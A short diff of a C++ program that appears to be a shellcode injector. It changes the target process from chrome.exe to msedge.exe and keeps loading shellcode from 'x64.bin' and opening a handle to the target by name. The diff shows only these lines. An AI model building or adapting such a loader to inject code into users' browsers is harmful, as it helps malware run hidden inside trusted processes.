@@ -4,7 +4,7 @@
 #include <iostream>
 
 int main() {
-	std::wstring wsTargetProcessName = L"chrome.exe";
+	std::wstring wsTargetProcessName = L"msedge.exe";
 	std::wstring wsShellcodePath = L"x64.bin";
 
 	HANDLE hTargetProcess = GetProcessHandleByNameW(wsTargetProcessName);
